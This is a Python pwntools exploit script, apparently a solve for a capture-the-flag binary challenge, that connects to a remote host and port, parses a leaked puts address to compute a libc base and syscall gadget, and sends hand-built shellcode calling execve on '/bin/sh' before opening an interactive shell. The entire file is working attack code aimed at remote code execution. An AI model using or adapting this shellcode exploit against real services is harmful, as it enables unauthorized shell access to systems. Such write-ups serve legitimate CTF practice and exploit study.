#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'challenge')
context.terminal = "/home/royalgamer/.local/src/st/st"

host = args.HOST or '172.210.129.230'
port = int(args.PORT or 1352)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

io = start()

data = io.recvline().decode()
data = int((data.strip("\n").split("*gives you DPH* 0x"))[1],16)
log.info(f"We got this : {hex(data)}")
putsadr = data
libcbase = putsadr - 0x0079bf0
syscall = (libcbase+0x02646e) 
io.recvuntil(b"code >> ")
# payload = b"\xb9\x00\x01\x00\xc0\x0f\x32\x48\xc1\xe2\x20\x48\x09\xd0"
shellcode= b""
shellcode += b"\x48\xbf\x69\x69\x69\x69\x69\x00\x00\x00"
shellcode += b"\x48\xc7\x07\x2f\x62\x69\x6e"
shellcode += b"\x48\xbf\x6d\x69\x69\x69\x69\x00\x00\x00"
shellcode += b"\x48\xc7\x07\x2f\x73\x68\x00"
shellcode += b"\xf3\x48\x0f\xae\xc0"  # mov rax, fs_base 
shellcode += b"\x48\xbb\x00\x60\x69\x69\x69\x00\x00\x00"
shellcode += b"\x48\x89\x03" # mov  [rbx] , rax
shellcode += b"\xc7\x03\x00\x00\x00\x00" # mov    DWORD PTR [rbx],0x0
shellcode += b"\xc7\x03" # mov    DWORD PTR [rbx],0x0
shellcode += p32(syscall)
shellcode += b"\x48\x8b\x1b"
shellcode += b"\x48\xbf\x69\x69\x69\x69\x69\x00\x00\x00" # set rdi
shellcode += b"\xb8\x3b\x00\x00\x00" # set rax
shellcode += b"\x48\x31\xf6"
shellcode += b"\x48\x31\xd2"
# shellcode += b"\xbb" # mov ebx
# shellcode += b"\x48\x83\xe3\x00"
# shellcode += b"\x48\x81\xcb"
# shellcode += p32(syscall)

shellcode += b"\xff\xe3" # jmp    rbx

io.sendline(shellcode)

io.interactive()

